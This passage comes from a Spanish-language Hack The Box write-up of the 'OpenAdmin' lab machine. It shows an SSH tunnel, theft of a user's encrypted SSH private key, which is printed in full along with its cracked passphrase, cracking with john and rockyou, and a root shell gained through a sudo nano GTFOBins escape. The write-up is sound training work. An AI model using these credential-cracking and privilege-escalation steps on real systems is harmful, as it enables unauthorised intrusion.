Warning: Permanently added '</span><span class="o">[</span>10.10.14.27]:2222<span class="s1">' (ECDSA) to the list of known hosts.
k4miyo@10.10.14.27'</span>s password: 
Linux k4mipc 5.14.0-2parrot1-amd64 <span class="c">#1 SMP Debian 5.14.6-2parrot1 (2021-09-25) x86_64</span>
 ____                      _     ____            
|  _ <span class="se">\ </span>__ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_<span class="o">)</span> / _<span class="sb">`</span> | <span class="s1">'__| '</span>__/ _ <span class="se">\|</span> __| <span class="se">\_</span>__ <span class="se">\ </span>/ _ <span class="se">\/</span> __|
|  __/ <span class="o">(</span>_| | |  | | | <span class="o">(</span>_<span class="o">)</span> | |_   ___<span class="o">)</span> |  __/ <span class="o">(</span>__ 
|_|   <span class="se">\_</span>_,_|_|  |_|  <span class="se">\_</span>__/ <span class="se">\_</span>_| |____/ <span class="se">\_</span>__|<span class="se">\_</span>__|
                                                 



The programs included with the Parrot GNU/Linux are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 28 21:14:59 2021 from 10.10.10.43
░▒▓    ~  ✔  with k4miyo@k4mipc ▓▒░ 
</code></pre></div></div>

<p>Validamos que el puerto 52846 se encuentra abierto en nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ lsof <span class="nt">-i</span>:52846
COMMAND    PID   USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
sshd    635608 k4miyo   10u  IPv6 2028358      0t0  TCP localhost:52846 <span class="o">(</span>LISTEN<span class="o">)</span>
sshd    635608 k4miyo   11u  IPv4 2028359      0t0  TCP localhost:52846 <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>

<p>Ahora nos abrimos el navegador hacia dicho puerto y apuntamos a nuestra shell:</p>

<p><img src="/assets/images/htb-openadmin/openadmin-web4.png" alt=""></p>

<p>Podemos ejecutar comandos como el usuario <strong>joanna</strong> y como pista si checamos el contenido del archivo <code class="language-plaintext highlighter-rouge">main.php</code>, nos dice que dicho usuario tiene su archivo <code class="language-plaintext highlighter-rouge">id_rsa</code>; por lo tanto, vamos a tratar de obtenerlo para posteriormente tratar de ingresar puerto el puerto 22.</p>

<p><img src="/assets/images/htb-openadmin/openadmin-web5.png" alt=""></p>

<p>Ya tenemos la <code class="language-plaintext highlighter-rouge">id_rsa</code>, asi que generamos un archivo con ese nombre, el damos permiso 600, creamos un hash con <code class="language-plaintext highlighter-rouge">ssh2john</code> y tratamos de crackearla.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>id_rsa
───────┬─────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼─────────────────────────────────────────────────────────────────
   1   │ <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
   2   │ Proc-Type: 4,ENCRYPTED
   3   │ DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
   4   │ 
   5   │ kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
   6   │ ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
   7   │ ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
   8   │ 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
   9   │ ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
  10   │ y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
  11   │ 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
  12   │ piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
  13   │ /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
  14   │ 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
  15   │ fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
  16   │ 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
  17   │ X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
  18   │ S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
  19   │ FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
  20   │ Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
  21   │ RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
  22   │ uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
  23   │ 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
  24   │ XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
  25   │ yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
  26   │ +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
  27   │ qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
  28   │ z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
  29   │ K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
  30   │ <span class="nt">-----END</span> RSA PRIVATE KEY-----
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ <span class="nb">chmod </span>600 id_rsa
❯ ssh2john.py id_rsa <span class="o">&gt;</span> <span class="nb">hash</span>
❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
finding a possible candidate.
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
bloodninjas      <span class="o">(</span>id_rsa<span class="o">)</span>
Warning: Only 2 candidates left, minimum 8 needed <span class="k">for </span>performance.
1g 0:00:00:02 DONE <span class="o">(</span>2022-01-02 22:55<span class="o">)</span> 0.4347g/s 6235Kp/s 6235Kc/s 6235KC/sa6_123..<span class="k">*</span>7¡Vamos!
Session completed
</code></pre></div></div>

<p>Tenemos la contraseña del archivo <code class="language-plaintext highlighter-rouge">id_rsa</code>, no del usuario. Ahora nos conectamos al servicio SSH como el usuario <strong>joanna</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa joanna@10.10.10.171
The authenticity of host <span class="s1">'10.10.10.171 (10.10.10.171)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.171<span class="s1">' (ECDSA) to the list of known hosts.
Enter passphrase for key '</span>id_rsa<span class="s1">': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan  3 05:01:33 UTC 2022

  System load:  0.0               Processes:             182
  Usage of /:   31.0% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ whoami
joanna
joanna@openadmin:~$
</span></code></pre></div></div>

<p>Ya somos el usuario <strong>joanna</strong> y podemos visualizar la flag (user.txt). Ahora debemos enumerar un poco el sistema para ver de que forma nos convertimos en <strong>root</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joanna@openadmin:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span>,1002<span class="o">(</span>internal<span class="o">)</span>
joanna@openadmin:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>joanna on openadmin:
    env_keep+<span class="o">=</span><span class="s2">"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET"</span>, env_keep+<span class="o">=</span><span class="s2">"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, mail_badpass

User joanna may run the following commands on openadmin:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">/bin/nano /opt/priv</code> como el usuario <strong>root</strong> sin proporcionar contraseña, por lo tanto vamos a utilizar nuestro recurso de confianza <a href="https://gtfobins.github.io/gtfobins/nano/#shell">gtfobins</a> y para este caso la opción <strong>a)</strong> para obtener una shell como el propietario del binario, que es <strong>root</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joanna@openadmin:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/nano /opt/priv


Command to execute: reset<span class="p">;</span> sh 1&gt;&amp;0 2&gt;&amp;0#                                                                                         
<span class="c">#  Get Help                                                     ^X Read File</span>
<span class="c">#  Cancel                                                       M-F New Buffer</span>
<span class="c"># whoami</span>
root
<span class="c"># </span>
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-02T00:00:00-06:00">January 02, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-bashed/" class="pagination--pager" title="Hack The Box Bashed
">Previous</a>
    
    
      <a href="/htb-obscurity/" class="pagination--pager" title="Hack The Box Obscurity
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
